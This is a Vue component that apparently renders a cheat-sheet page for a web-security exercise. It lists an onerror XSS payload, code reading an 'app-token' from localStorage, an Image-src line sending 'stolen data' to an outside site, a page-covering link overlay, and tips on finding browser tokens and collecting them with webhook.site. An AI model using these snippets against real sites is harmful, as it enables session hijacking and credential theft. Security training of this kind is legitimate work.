<template>
  <section>
    <h3>Useful pieces of code</h3>
    <hr />
    <p><strong>Test input data for unfiltered html</strong></p>
    <div class="code">
      <pre><span style="color: #007700">&lt;strong&gt;</span>Hello world!<span style="color: #007700">&lt;/strong&gt;</span>
</pre>
    </div>

    <p><strong>Execute javascript in unfiltered input data</strong></p>

    <!-- HTML generated using hilite.me -->
    <div class="code">
      <pre><span style="color: #007700">&lt;img</span> <span style="color: #0000CC">src=</span><span style="background-color: #fff0f0">&quot;&quot;</span> <span style="color: #0000CC">onerror=</span><span style="background-color: #fff0f0">&quot;alert(&#39;Hello world!&#39;);&quot;</span> <span style="color: #007700">/&gt;</span>
</pre>
    </div>

    <p><strong>Extract a value from localStorage.</strong></p>

    <!-- HTML generated using hilite.me -->
    <div class="code">
      <pre><span style="color: #008800; font-weight: bold">const</span> token <span style="color: #333333">=</span> localStorage.getItem(<span style="background-color: #fff0f0">&#39;app-token&#39;</span>);
</pre>
    </div>

    <p><strong>Send (stolen) data to your own website.</strong></p>

    <!-- HTML generated using hilite.me -->
    <div class="code">
      <pre><span style="color: #008800; font-weight: bold">var</span> i <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">new</span> Image();
i.src <span style="color: #333333">=</span> <span style="background-color: #fff0f0">&#39;https://mywebsite.com/&#39;</span> <span style="color: #333333">+</span> myStolenData;
</pre>
    </div>

    <p><strong>Create a link that spans the whole page.</strong></p>

    <div class="code">
      <pre><span style="color: #007700">&lt;a</span> <span style="color: #0000CC">href=</span><span style="background-color: #fff0f0">&quot;/link-to-my-page&quot;</span>
   <span style="color: #0000CC">style=</span><span style="background-color: #fff0f0">&quot;position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: 1;&quot;</span><span style="color: #007700">&gt;</span>
   Can you click me?
<span style="color: #007700">&lt;/a&gt;</span></pre>
    </div>

    <h3 class="mt-5">Useful sites and information</h3>
    <hr />
    <p><strong>Finding browser tokens, secrets, cookies, et cetera</strong></p>
    <p>On Firefox and Chrome: press the F12 Key. In Chrome, go to the Storage tab. In Firefox, go to the Application tab. All user tokens should be here.</p>

    <p><strong>Creating a webhook to send stolen information to</strong></p>
    <p>You can create a link at <a href="https://webhook.site/">webhook.site</a>. This link stores all requests made to it.</p>
  </section>

</template>

<style scoped>
div.code {
  background: #ffffff;
  overflow: auto;
  width: auto;
  border: solid gray;
  border-width: 0.1em 0.1em 0.1em 0.8em;
  padding: 0.2em 0.6em;
  margin-bottom: 1em;
}

div.code pre {
  margin: 0;
  line-height: 125%;
}
</style>
